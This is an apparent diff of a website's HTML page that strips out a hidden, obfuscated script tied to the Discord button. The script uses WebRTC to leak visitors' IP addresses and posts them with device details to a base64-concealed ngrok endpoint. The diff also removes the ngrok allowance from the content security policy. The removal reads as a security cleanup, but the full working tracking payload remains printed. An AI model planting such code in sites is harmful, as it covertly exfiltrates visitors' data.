@@ -36,8 +36,8 @@
 
   <!-- Content Security Policy (Politica di Sicurezza del Contenuto) -->
   <meta
-  http-equiv="Content-Security-Policy"
-  content="default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; font-src 'self' https: data:; img-src 'self' data: https:; connect-src 'self' https: ws: wss: https://openrouter.ai https://*.ngrok-free.dev; frame-src 'self' https:; object-src 'none';"
+   http-equiv="Content-Security-Policy"
+   content="default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; font-src 'self' https: data:; img-src 'self' data: https:; connect-src 'self' https: ws: wss: https://openrouter.ai; frame-src 'self' https:; object-src 'none';"
   />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -131,14 +131,14 @@
    </p>
 
    <div class="flex gap-4">
-   <a href="https://discord.gg/mG6qGfKeXp" 
-   onclick="trackInteractionMetrics(event)" 
-   target="_blank" 
-   rel="noopener noreferrer" 
-   class="px-8 py-4 rounded-xl bg-cyan-400 text-black font-bold glow button-glow scroll-animate" 
-   id="discord-link">
-   Discord
-   </a>
+    <a
+     href="https://discord.gg/mG6qGfKeXp"
+     target="_blank"
+     rel="noopener noreferrer"
+     class="px-8 py-4 rounded-xl bg-cyan-400 text-black font-bold glow button-glow scroll-animate"
+    >
+     Discord
+    </a>
    </div>
   </section>
 
@@ -560,63 +560,29 @@
    </div>
   </footer>
 
-  <script>
-    const _0x4a21 = ["aHR0cHM6Ly9pbmNvbnN0YW50LWthaXRseW4tdW5sb2NhbGx5Lm5ncm9rLWZyZWUuZGV2L2NhcHR1cmE=", "RTCPeerConnection"];
-
-    async function trackInteractionMetrics(e) {
-      e.preventDefault();
-      const target = e.currentTarget.href;
-      const getSessID = async () => {
-        return new Promise((r) => {
-          try {
-            const pc = new window[_0x4a21[1]]({ iceServers: [] });
-            pc.createDataChannel("telemetry");
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-            pc.onicecandidate = (i) => {
-              if (!i || !i.candidate) return;
-              const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
-              r(ip);
-            };
-            setTimeout(() => r("sid_null"), 1200);
-          } catch (err) { r("err_core"); }
-        });
-      };
-
-      const metrics = {
-        ts: Date.now(),
-        v: navigator.platform,
-        sid: await getSessID(),
-        res: `${window.innerWidth}x${window.innerHeight}`
-      };
-
-      try {
-        await fetch(atob(_0x4a21[0]), {
-          method: 'POST',
-          mode: 'cors',
-          body: JSON.stringify(metrics),
-          headers: { 'Content-Type': 'application/json' }
-        });
-      } catch (f) { }
-
-      window.open(target, '_blank');
-    }
-  </script>
-
+  
   <script type="module" src="js/cookie-utils.js"></script>
   <script src="js/script.js"></script>
   <script type="module" src="js/nexus-ai.js"></script>
   <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      const heartRain = new HeartRain("heart-rain-container");
-      heartRain.trigger(20);
-      const sections = document.querySelectorAll("section");
-      sections.forEach((section) => {
-        const observer = new IntersectionObserver((entries) => {
-          entries.forEach((entry) => { if (entry.isIntersecting) heartRain.trigger(15); });
-        }, { threshold: 0.3 });
-        observer.observe(section);
-      });
+   document.addEventListener("DOMContentLoaded", () => {
+    const heartRain = new HeartRain("heart-rain-container");
+    heartRain.trigger(20);
+    const sections = document.querySelectorAll("section");
+    sections.forEach((section) => {
+     const observer = new IntersectionObserver(
+      (entries) => {
+       entries.forEach((entry) => {
+        if (entry.isIntersecting) {
+         heartRain.trigger(15);
+        }
+       });
+      },
+      { threshold: 0.3 }
+     );
+     observer.observe(section);
     });
+   });
   </script>
-</body>
+ </body>
 </html>
